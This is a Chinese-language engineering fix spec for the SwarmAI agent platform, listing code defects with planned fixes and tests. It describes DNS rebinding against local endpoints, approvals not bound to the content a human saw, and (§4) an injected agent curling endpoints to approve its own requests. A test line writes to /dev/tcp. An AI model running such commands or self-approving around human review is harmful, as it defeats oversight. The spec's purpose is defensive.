---
title: Fixing spec：四份 HLD 审查发现的明确缺陷
created: 2026-10-28
updated: 2026-10-28
project: SwarmAI
status: draft r2 — 已过一次零上下文前提审查，待用户拍板 §4 的三个决策
---

# Fixing spec：四份 HLD 审查发现的明确缺陷

**日期：** 2026-10-28 | **状态：** 第二版，已过一次零上下文的前提审查，待你拍板第 4 节

**修订记录：** 第一版经一次前提审查，审出 20 条问题，其中 7 条 HIGH，本版逐条按原因改过：

- **会弄坏或可被绕过的修法：**
  - Host 白名单在 Hive 上会把所有请求拒掉。
  - 审批哈希如果由 Hive 写、面板原样带回，伪造者可以照抄。
  - 用户用例升级时重新签名，会把手改过的用例重新认可。
  - HTML 改名会断掉报告链接。
- **把有意的设计当成了缺陷：**
  - `runs` 去掉 request_id。
  - behavior 用例不计入告警。
  - digest 范围。
  - 考题超时记 error。
  - 大脑卡片的计数。

行号按 HEAD `aaf257fa0` 重新读过。

## 1. 来源与收录标准

2026-10-27 写的四份对外 HLD（会话运行时、Eval-First、人如何监督 agent、Swarm Out）经零上下文审查，文档问题已在 HLD 里改完。本文只处理代码缺陷。

一条问题要收进来，三条都得满足：

1. 代码的行为违背了这个机制自己写明的意图（注释、docstring、设计文档、界面文字），或违背产品已有的安全规则。附近有写明理由的有意设计，不算。
2. 写本文时重新读过 file:line。
3. 修法不需要先做一个新设计。

**判为有意设计、不收的审查意见：**

| 审查意见 | 理由在哪里 |
|---|---|
| 90% 流式 kill 不经过 `RecoveryCoordinator`、不看 Stop | 注释写明这是多会话之间的仲裁，必须无视 Stop，否则整机 OOM（`backend/core/lifecycle_manager.py:620-631`）。但它该不该存在有矛盾，见决策 2 |
| 幂等账本读写失败时放行 | "坏掉的账本不能挡住聊天"，记 ERROR（`backend/core/send_requests.py:18-20`、`:74-77`） |
| 定时评测的出错比例不算 behavior 用例 | behavior 的 spawn 失败是不确定的基础设施抖动，算进去会误报（`backend/jobs/handlers/eval_scheduled.py:188-191`、`:214-218`）。真正的缺陷是 judge 调用失败也被一起排除，见 C2 |
| `code_digest` 不覆盖被测代码 | 范围有意收窄，否则无关改动让门禁永远过期（`backend/scripts/eval_runner.py:103-108`）。缺的只是评测自己的输入，见 E1。要不要绑定被测代码是一个新决定，见第 6 节 |
| HTML 报告同一天同一种触发会覆盖 | `_report_names` 按这个命名把报告挂到当天最新一次运行上（`backend/core/eval_service.py:270-276`） |
| 离线考题超时记 `error` | `scenario_runner` 和 `eval_runner.py:1550-1552` 写明超时按 error 计 |
| Run Canary 不跑反例 | 同步接口有 5 秒的时限（`backend/core/eval_service.py:1315-1316`）。缺陷在门禁一侧，见 C4 |
| Hive 详情返回明文密码 | `HiveInstanceDetailResponse` 的 NOTE 写明这是有意的（`backend/routers/hive.py:229-237`）。在 DNS rebinding 面前它才成问题，归到 A1 |
| Swarm Out 的 `runs` 输出带 `request_id` | 面板回答要用它（`desktop/src/services/swarmOut.ts:67`、`:72-73`），agent 也能直接 curl 同一个路由。去掉它挡不住任何东西，见决策 1 |
| bridge 镜像 Hive 上所有会话的问题 | 设计如此（`backend/core/swarm_out_bridge.py:8-9`）。缺陷只是卡片不写来源，见 B4 |
| 大脑卡片计数排除治理条目 | 卡片已经按大脑调用 `collect(brain=…)`，治理条目不属于任何大脑（`backend/routers/ddd_brain.py:311-329`）。缺陷只是标签，见 H2 |

## 2. 缺陷总表

**严重度：**
- **P0**：外部可利用的安全问题，或者"失败显示成通过"。
- **P1**：计数、新鲜度、资源保护的顺序。
- **P2**：界面或文字和行为不一致。

| ID | 缺陷 | 位置 | 严重度 |
|---|---|---|---|
| A1 | 本机 daemon 不校验 Host 头。网页经 DNS rebinding 成为同源后，可以读 `/api/hive/instances/{id}/credentials`、`reset-password` 返回的 Hive 密码，并调用审批类接口。CORS 管不到同源请求 | `backend/main.py:1742-1753`（只有 `HiveAuthMiddleware` 和 CORS），`backend/routers/hive.py:615-648` | P0 |
| B1 | 审批卡不显示截断：bridge 和本机两端都把命令截到 2000 字，卡片没有标记 | `backend/core/swarm_out_bridge.py:154-158`，`backend/core/swarm_out.py:229`，`desktop/src/components/swarm-out/LiveDispatches.tsx:56-64` | P0 |
| B2 | 审批卡不显示工具名。`tool_name` 写进了 bridge 的记录，本机 `_clean_ask` 和界面都不传、不显示 | `backend/core/swarm_out.py:216-243`，`LiveDispatches.tsx:56-64` | P0 |
| B3 | 答案只带 `request_id` 和决定，不绑定人看到的内容。已镜像的 `ask/` 被改写后，人批准的是改写后的文字，放行的是原来的请求 | `backend/core/swarm_out.py:336-346`，`backend/core/swarm_out_bridge.py:231-232` | P0（见决策 1） |
| B4 | 面板上非派发会话的问题和派发出去的混在一起，卡片不写来源 | `backend/core/swarm_out.py:279-299`，`LiveDispatches.tsx:55` | P2 |
| C1 | 部署后的 canary 永远报通过：判定读运行记录里不存在的 `passed` 字段，`status` 恒为 `completed`。curl 没有 `-f`。它只发警告、不阻断 | `prod.sh:593-599` | P0 |
| C2 | judge 调用失败（凭据过期、模型不可用）和 behavior 的 spawn 失败被一起排除在出错比例之外，judge 整批失败时不告警 | `backend/jobs/handlers/eval_scheduled.py:192-198`，对照 judge 出错点 `backend/scripts/eval_runner.py:1395-1399` | P0 |
| C3 | 红线用例不做签名过期检查。绕过校验改过的红线用例照样参与放行，并从 BVT 计数里消失 | `backend/core/eval_release.py:75-76`、`:130-135` | P0 |
| C4 | 门禁按修改时间取最新报告，不知道这份报告有没有跑反例。报告里也没有记录这件事 | `backend/scripts/ci_eval_gate.py:44-61`，`backend/scripts/eval_runner.py:1987-2027` | P0 |
| C5 | 用户用例连续通过后自动升 `stable`，签名随之失效。门禁档的用例因此让放行判定变成 `incomplete`，其他用例悄悄掉出快速检查 | `backend/core/eval_service.py:1030-1048`、`:1335`，`backend/core/eval_release.py:129-130` | P0 |
| C6 | 会话结束时的快速检查只看 `cases_failed`，超时的用例不算 | `backend/hooks/context_health_hook.py:444-458` | P0 |
| D1 | 治理改动的翻转比较：改动后每次都出错或超时的用例不进任何一组，一次出错加一次失败被算成确定退化 | `backend/scripts/eval_runner.py:2311-2330` | P1 |
| D2 | 线上评分：部分 judge 调用失败的会话不进 O4、O5，也不单独计数。没有数据时界面显示 0 或 0/0 | `backend/jobs/handlers/session_quality.py:291-300`，`desktop/src/pages/eval/OnlineTab.tsx:31-35` | P1 |
| D3 | 结尾卡交付物超过 12 个就丢掉，不记数量、不显示 "+N"。旁边的改动卡有 `omitted` | `backend/core/session_router.py:49`、`:2523`、`:5579`，对照 `backend/core/turn_changes.py:636-643` | P1 |
| D4 | 本机 `_clean_ask` 只留前 20 个问题、每题前 10 个选项，丢掉空标签的选项，都不记数 | `backend/core/swarm_out.py:233-240` | P1 |
| E1 | `code_digest` 不覆盖评测自己的输入：探针、探针工具包、样例工作区。这些改了，报告不过期 | `backend/scripts/eval_runner.py:109-118` | P1 |
| E2 | 门禁按文件修改时间取报告，服务和命令行已经按记录里的触发时间取 | `backend/scripts/ci_eval_gate.py:51` | P1 |
| E3 | 命令安全过滤漏掉自己的两个例子：`rm -rf /` 和 `/dev/tcp`，因为 `\b` 在 `/` 旁边不匹配 | `backend/scripts/eval_runner.py:568-572` | P1 |
| E4 | 用户用例的运行记录保存 240 字的工具输入（路径、搜索词），写进被 git 跟踪的 EvalHistory | `backend/scripts/eval_runner.py:1404-1418`，`backend/scripts/scenario_runner.py:73-77` | P1 |
| F1 | 90% 流式 kill（Trigger 2）的注释说"只在 IDLE 驱逐之后触发"，循环里却排在 IDLE 驱逐之前。`_check_memory_pressure` 的 docstring 又说杀流式会话的断路器"已经删掉，它造成过数据丢失"。两段注释互相矛盾，和代码也不一致 | `backend/core/lifecycle_manager.py:288`、`:295`、`:619-622`、`:1681-1686` | P1（见决策 2） |
| F2 | 准入：排队唤醒后驱逐一个 IDLE 会话就直接放行，不重新检查 `spawn_budget`，和 `:3063-3066` 的注释"每个驱逐分支都重新检查"矛盾 | `backend/core/session_router.py:3134-3139` | P1 |
| G1 | `collect()` 约定"只读、从不写盘"，却删除恢复标记文件 | `backend/core/attention_authority.py:669` | P2 |
| G2 | transcript 丢失分支的注释说"要等下一次发送"，代码却在 turn 结束时触发 drain | `backend/core/session_router.py:5289-5293` 对照 `:5311-5313` | P2 |
| G3 | `context_injector` 的 docstring 说未提交状态从不裁剪，裁剪顺序里第三个就是它 | `backend/core/context_injector.py:1251-1252` 对照 `:826-827` | P2 |
| G4 | `_arm_recovery_checkpoint` 的 docstring 说"任何保留会话身份的 kill → COLD 路径"都会写检查点，但 TTL、IDLE 驱逐、僵尸强杀不写 | `backend/core/session_unit.py:5563-5571` | P2 |
| H1 | 失败卡的注意力层是 know、卡上没有按钮，却显示橙色 "Needs you" | `desktop/src/pages/chat/components/AssistantMessageView.tsx:438`，对照 `desktop/src/pages/chat/attention.ts:25` | P2 |
| H2 | 大脑卡片的计数包括升级和暂停的 run，标签却是 "proposals awaiting review" | `desktop/src/components/layout/DddCard.tsx:322` | P2 |
| J1 | Swarm Out 等 session id 超时：请求已发出，本机却报通用 500、不写派发记录。第一次派给这台 Hive 时，它的问题也不会出现在面板上 | `backend/core/swarm_out.py:161-163`、`:279-284`，`backend/routers/swarm_out.py:40-49` | P1 |
| J2 | Hive 夜间备份的错误被 `2>/dev/null` 吞掉，审查认为它写不了 S3（未实测） | `backend/hive/user_data.py:217-227` | P2 |
| J3 | 多选问题只能选一个选项 | `desktop/src/components/swarm-out/LiveDispatches.tsx:80` | P2 |
| J4 | 示例卡片上的 Judge 弹窗写"由代码从 run 事件生成（run_audit.json）" | `desktop/src/components/swarm-out/JudgeTag.tsx:75-77` | P2 |
| K1 | Offline Eval 页写"每天第一次会话时自动跑"，实际是会话结束后跑。"说明文字不写会变的值"的前端测试已被删除 | `desktop/src/pages/eval/OfflineTab.tsx:42`、`:53` | P2 |
| K2 | 行为规则把评测的触发写成"CI、部署、定时"，CI 实际只跑评测机制自己的单元测试 | `backend/context/AGENT.md:272-275` | P2 |
| K3 | 系统自我描述漂移：规则文件里的 "Understanding" 标签已删，显示规范的蜜蜂 30 秒行为已改，领域技术文档有过期常数 | supervision HLD §26 #12 | P2 |

## 3. 按根因分组的修法

每组写清：根因、同一个原因的全部站点、一种修法、证明修法的测试。测试一律满足"把修法回退，测试就变红"，用 `scripts.mutation_check` 证明。

### A. 本机接口对网页同源请求敞开（A1）

**根因：** daemon 只监听 127.0.0.1，于是假定能连上的请求都来自本机。DNS rebinding 让任意网页成为同源，而 CORS 只管跨源请求。这是外部攻击面，不属于 P5 说的"agent 作恶"。

**修法：**
- 加一个**纯 ASGI** 中间件（不能用 `BaseHTTPMiddleware`，否则 SSE 会被缓冲，见 `backend/middleware/hive_auth.py` 文件头）。
- 不在 Hive 模式时，只接受 `127.0.0.1:<port>` 和 `localhost:<port>`，`<port>` 取 daemon 实际绑定的端口，其余 Host 返回 421。
- Hive 模式不检查 Host：那里看到的 Host 是 CloudFront 域名，实例上没有任何地方知道它（`HIVE_DOMAIN` 从没被设置，`backend/main.py:1729`），而且 Caddy 和 `HiveAuthMiddleware` 已经要求 basic auth。
- webview 用的是 `http://localhost:${port}`（`desktop/src/services/tauri.ts:67`），在白名单内。

**测试：**
- 非 Hive 模式，`Host: evil.example:18321` 请求 `/api/hive/instances/x/credentials` 和 `/api/swarm-out/asks/h/s/r/answer`，返回 421。
- `localhost` 和 `127.0.0.1` 都正常。
- Hive 模式下任意 Host 都不被这层拦。
- SSE 路由逐条流出，不被缓冲。
- 先 grep 一遍本机所有调用 loopback 的地方（`scripts/`、jobs、hooks、MCP 配置），确认都用 `127.0.0.1` 或 `localhost`。

### B. 人看到的和被放行的没有绑定（B1、B2、B3，以及 B4 的显示部分）

**根因：** 审批从 Hive 到面板、再回到 Hive，全程只靠 `request_id` 一个标识。人看到的内容和最终放行的请求之间，没有任何一处比对。本机 `_clean_ask` 又只留下一部分字段，界面拿不到判断所需的信息。

**修法：**
- **bridge 镜像时：** 多写 `truncated`（命令是否被截断）。现有的 `tool_name` 不变。
- **本机 `_clean_ask`：**
  - 透传 `tool_name` 和 `truncated`。
  - 自己再算一次截断，命令超过 2000 字也标为 `truncated`。
  - 用自己交给面板的 `tool_name` 和命令算 `shown_sha256`。
  - 问题和选项被截掉时记下数量（D4）。
- **回答时：** 面板把 `shown_sha256` 带回，本机写进答案。
- **bridge 送达前：** 对提示板上的原请求套用同一个截断函数，再算一次哈希。和答案里的不一致就不送，在 `closed/` 写明"内容不一致"。哈希由本机按展示内容计算、由 bridge 按原请求复算，伪造的 `ask/` 无论写什么都对不上。不用条件写入：Hive 上的进程可以抢先写，bridge 的条件写入会因此报错，整台 Hive 的镜像就停了。
- **卡片：**
  - 显示工具名。
  - `truncated` 时写"命令超过 2000 字，未完整显示"，不给"批准"按钮，只留"拒绝"和"去 Hive 网页处理"。
  - B4：按现有的 `(hive_id, session_id)` 关联（`backend/core/swarm_out.py:296-298`）写明属于哪次派发，没有派发的写"Hive 上的其他会话"。不加新字段。

**测试：**
- 改写 `ask/` 里的命令后回答，答案不送达，`closed/` 写明不一致。
- 未改写时正常送达。
- 超长命令的卡片没有批准按钮。
- 卡片渲染出工具名。
- 非派发会话的卡片写明来源。

### C. 失败的检查显示成通过（C1–C6）

**根因：** 每个读结论的地方读的都是覆盖不到失败的字段或子集。

**修法：**

| 站点 | 改法 |
|---|---|
| C1 `prod.sh` | curl 加 `-f`，按 `bvt.green` 和红线结果判定，缺字段算失败。不用 `release.verdict`：只跑确定性检查的运行遇到需要模型判的红线用例时，它会是 `incomplete`。这个检查仍只发警告 |
| C2 定时评测告警 | 运行记录的出错用例加一个 `error_kind` 字段（`judge`、`spawn`、`timeout`、`other`），出错比例按 `judge` 算，包括 behavior 用例。spawn 失败照旧不算 |
| C3 放行判定 | `_stamp_stale` 对红线和门禁两档都检查 |
| C4 门禁 | 运行记录加 `negatives_ran`，门禁只接受它为真的报告。现有报告没有这个字段，门禁会报"无法核实"（退出码 2），要等下一次全量运行或一次命令行运行。同步的 Run Canary 不改 |
| C5 自动升级 | 只有签名在升级前仍然有效时才升级并重新签名，否则不升级、在清单里列出来。连续通过计数不看签名，不能用它来认可手改过的用例 |
| C6 会话结束的快速检查 | 超时和失败一样计入 |

**共用测试：** 对每个站点注入一种失败：用例失败、HTTP 500、judge 全部出错、红线用例签名过期、报告没跑反例、手改过的用例达到升级次数、用例超时。断言结论不是通过，并且有一条人能看到的原因。另加两个测试：spawn 失败不触发 judge 告警。升级前签名有效的用例升级后仍在快速检查里。

### D. 被丢掉的东西没有计数（D1–D4）

**根因：** 列表或分母在某一步被截断或过滤，但没有记下丢了多少，读的人以为看到的是全部。仓库里已经有正确的做法，就是改动卡的 `omitted`（`backend/core/turn_changes.py:636-643`）。

**修法：** 每个丢弃点照 `omitted` 记数量，并显示出来。

- **D1：** 加一组"这一轮没测成"。"确定退化"要求改动后 N 次结果都确定（N 是 `--repeat`）。改动前固定跑两次的基线不变（`docs/design/2026-10-26-evolution-loop-admission.md:160-166`）。
- **D2：** judge 失败的会话单独计数。没有数据时显示原因，不显示 0。
- **D3：** 结尾卡的记录写 `omitted`，卡片显示 "+N"。
- **D4：** 见 B 组。

**测试：**
- 改动后全部出错的用例出现在"没测成"组。
- 一次出错加一次失败不算确定退化。
- judge 失败的会话进入失败计数。
- 15 个交付物时，`omitted=3`，卡片显示 "+3"。
- 25 个问题时记 `omitted=5`。

### E. 评测自己的边界（E1–E4）

**修法：**
- **E1：** digest 加入 `backend/scripts/probe_*.py`、`_probe_kit.py`、`recall_chain_probe.py`、`backend/templates/eval/fixtures`。
- **E2：** 门禁改为按触发时间取报告，和服务端、命令行一致。
- **E3：** 只修两个 `\b` 写法，让 `rm -rf /` 和 `/dev/tcp/` 能匹配上。解释器里发起的网络访问不加拦截：这个过滤器只针对"不太可信的自动化"，按 P5 不防 agent。
- **E4：** 用户用例的轨迹只存工具名。

**测试：**
- 改一个探针文件，报告变成过期。
- 修改时间和触发时间顺序相反时，门禁取触发时间较新的那份。
- `rm -rf /` 和 `echo x > /dev/tcp/1.2.3.4/80` 被拒。
- 用户用例的记录里没有工具输入。

### F. 资源保护的顺序和预算（F1、F2）

**修法：**
- **F1：** 先等决策 2。如果保留 Trigger 2：
  - 把它挪进 `_check_memory_pressure`，放在 IDLE 那一层之后执行，执行前重新采样内存和 RSS。
  - 和 Trigger 1 共用一个"本轮已经杀过"的标志，保持一轮最多杀一个。
  - 改掉 docstring 里"已经删掉"那句。

  如果删掉，就删 `:619-647`，并把 HLD 和 docstring 改成一致。
- **F2：** 一次排队等待里最多驱逐一个 IDLE 会话，驱逐之后重新检查预算，仍然不够就回去接着等。排满后的强制驱逐照旧"最后手段、照样放行"：这是唯一的防饿死保证，`:3142-3144` 写明不许软化。只把 `:3063-3066` 的注释改成说实话，并在这条路径上记录预算原因。

**测试：**
- F1（如果保留）：91%，有一个 IDLE 和一个 STREAMING 会话，驱逐 IDLE 后降到阈值以下，STREAMING 会话存活。一轮里 Trigger 1 杀过之后，Trigger 2 不再杀。
- F2：唤醒驱逐一次后预算仍然不够，不返回就绪，也不再驱逐第二个。

### G. 说谎的约定和注释（G1–G4）

**修法：**
- **G1：** 删掉 `:669` 的清理。`write_recovery_marker` 已经会清掉已处理的条目（`backend/core/data_safety.py:157-170`）。
- **G2：** 先补一个执行级测试，证明 transcript 丢失后，排队的消息会在 turn 结束时由 drain 送出，再改注释。
- **G3、G4：** 改 docstring。G4 写明只有正在干活的会话被非自愿杀掉时才写检查点，空闲的 kill 不写，并说明原因。

**测试：**
- `collect()` 执行前后文件系统没有变化。
- G2 的执行测试：回退 `queued_while_busy` 调用就变红。

### H. 注意力的显示（H1、H2）

**修法：**
- **H1：** 失败卡的标签按 `attention.ts` 的层级取样式，know 层用次要颜色显示 "Failed"。
- **H2：** 标签按来源写，或者统一写成"需要你处理"，和左栏一致。

**测试：**
- 失败卡不带 act 层的样式。
- 有一个暂停 run 的大脑，卡片标签不写 proposals。

### J. Swarm Out 的健壮性（J1–J4）

**修法：**
- **J1：** 超时变成 `SwarmOutError`，报"可能已在 Hive 上运行，先去 Hive 网页看一眼再重派"。派发记录照写一行，`session_id` 留空，让这台 Hive 能出现在面板的查询里。按 id 回查需要 Hive 端新接口，放到第 6 节。
- **J2：** 先在一台 Hive 上跑一次备份，看是权限问题还是别的问题，再修。错误写进日志，不再丢掉。
- **J3：** 多选题支持选多个。
- **J4：** 示例卡片的弹窗写"示例数据"。

**测试：**
- 超时的派发出现在列表里，并带说明。
- 多选题能提交多个选项。
- J2 要实测。

### K. 文字和自我描述（K1–K3）

**修法：**
- **K1：** 改 Offline 页的文字，恢复"说明文字不写会变的值"这条前端测试。
- **K2：** 改 `AGENT.md` 的措辞。这是治理文件，走 s_self-evolution，由你批准。
- **K3：** 按代码同步规则文件、显示规范和领域技术文档，包括 session runtime HLD §13 关于 90% kill 的那一行。

## 4. 需要你拍板的决策

1. **被 Hive 内容注入的本机 agent，算不算 P5 说的"agent 作恶"。**
   - **现状：** agent 可以直接 curl 本机的 `/api/swarm-out/runs` 拿到 `request_id`，再 curl 回答接口替人批准。挡住它的只有 skill 里的一句规定。
   - **算（推荐，与 pipeline 的人在环路一致）：** 不做加密级隔离，在 HLD 和面板上如实写明。B3 的内容绑定照做，因为它成本低，而且挡的是 Hive 上的进程改写问题，不是本机 agent。
   - **不算：** 要加一个本机 agent 拿不到的凭证。比如 Tauri 每次启动时生成、只放在 webview 内存里的 token，daemon 经 macOS Keychain ACL 或 unix socket 的对端进程校验。这要在三个平台各做一遍，还要推翻 P5。
2. **90% 流式 kill 该不该存在。** 两段注释互相矛盾，过去 10 天的日志里它一次都没触发过。
   - **保留并挪到 IDLE 驱逐之后（推荐）：** 它在杀之前写检查点，防的是整机 OOM，平时没有代价。
   - **删掉：** 依赖单会话 7 GB 的上限和系统的 jetsam。
3. **怎么做（R1）。** A、B、F 是安全和会话生命周期的跨模块改动，按规则先问你：直接改，还是走 pipeline。其余各组都在单个模块内，我直接改。

## 5. 验证计划

**落地顺序：** A1 → C → B（含 D4、J1）→ F → D、E → G、H、J、K。A1 是一个中间件，影响最大。C 修好后，之后每次部署的 canary 才可信。

| 组 | 写修法时 | 提交前 | 评审 |
|---|---|---|---|
| A | A 的测试、mutation 检查、loopback 调用方清单 | hive 路由、swarm_out 路由的测试，`test_hive_auth*` | security |
| B | B 的测试 | `test_swarm_out_bridge.py`、`test_swarm_out_host.py`、`swarm-out` 前端测试 | security、correctness |
| C | 共用失败注入测试 | eval_release、ci_eval_gate、eval_scheduled、context_health_hook 的测试 | correctness |
| D、E | 各站点的测试 | 被改函数的测试 | correctness |
| F | F 的场景测试 | lifecycle_manager、session_router 准入的测试 | concurrency、state-machine |
| G、H、J、K | 各自的测试 | 被改组件的测试 | 不需要 |

**全部做完后跑一次的不变量：**
- 非 Hive 模式下，非本机 Host 访问不了任何接口。
- 被改写的审批不会送达。
- 每一种注入的失败都不会让 canary、门禁或告警显示通过。
- 每个截断点都有计数。
- （如果保留 Trigger 2）90% 时 IDLE 先于 STREAMING 被驱逐，一轮最多杀一个。

**部署：** A、C6、F 要重新 build 并重启 daemon，重启需要你同意（R12）。评测相关的验证只用单元测试，不手跑系统评测。C4 上线后，在下一次全量运行之前，门禁会报"无法核实"。

## 6. 不在本轮

| 项 | 原因 |
|---|---|
| 调用用时重载后消失 | 需要新的持久化字段，读写两侧都要设计 |
| steer 确认失败时可能重发一次 | 已接受的残余风险，先统计它是否真的发生 |
| 发布门禁是否绑定被测产品代码 | 现在有意不绑定。要绑定得先决定绑定的范围，否则门禁会一直处于过期状态 |
| Swarm Out 超时后按 id 回查 | Hive 端没有按客户端 id 找会话的接口，旧 Hive 还要重新部署 |
| 同账户旧 Hive 保留整桶读权限 | 修法是运维动作，代码侧只差一个提示 |
| Hive 密码熵、bridge 前缀 lifecycle、迁移框架自动备份 | 开放问题，没有违背已写明的意图 |
